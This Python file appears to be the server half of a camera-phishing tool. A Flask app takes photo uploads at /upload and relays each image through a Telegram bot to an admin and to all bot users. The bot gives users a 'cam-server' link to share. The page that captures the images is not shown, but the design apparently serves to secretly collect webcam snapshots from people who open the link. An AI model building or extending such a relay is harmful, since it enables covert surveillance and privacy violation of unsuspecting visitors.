from flask import Flask, render_template, request
import telebot
import threading
import os

# Bot setup
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
ADMIN_ID = os.getenv("ADMIN_ID", "YOUR_ADMIN_ID_HERE")  # your chat id
bot = telebot.TeleBot(BOT_TOKEN)

# Store user IDs
user_ids = set()

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    if 'photo' in request.files:
        photo = request.files['photo']

        # Save temporarily
        temp_path = f"temp_{threading.get_ident()}.jpg"
        photo.save(temp_path)

        # Send to Telegram in background
        threading.Thread(target=send_photo, args=(temp_path,)).start()

    return "OK"

# Handle /start command
@bot.message_handler(commands=['start'])
def start_handler(message):
    user_ids.add(message.chat.id)
    username = message.from_user.first_name or "User"
    bot.send_message(
        message.chat.id,
        f"👋 Hello {username}, this is your link:\nhttps://cam-server-project.onrender.com"
    )

def send_photo(path):
    try:
        # Send to admin
        with open(path, 'rb') as img:
            bot.send_photo(ADMIN_ID, img)

        # Send to all registered users (except admin)
        for uid in list(user_ids):
            if str(uid) != str(ADMIN_ID):
                try:
                    with open(path, 'rb') as img:
                        bot.send_photo(uid, img)
                except Exception as e:
                    print(f"❌ Failed to send to {uid}: {e}")

    except Exception as e:
        print("❌ Telegram send error:", e)
    finally:
        try:
            os.remove(path)
        except:
            pass

def run_bot():
    bot.polling(none_stop=True)

if __name__ == "__main__":
    threading.Thread(target=run_bot).start()
    app.run(host='0.0.0.0', port=10000)
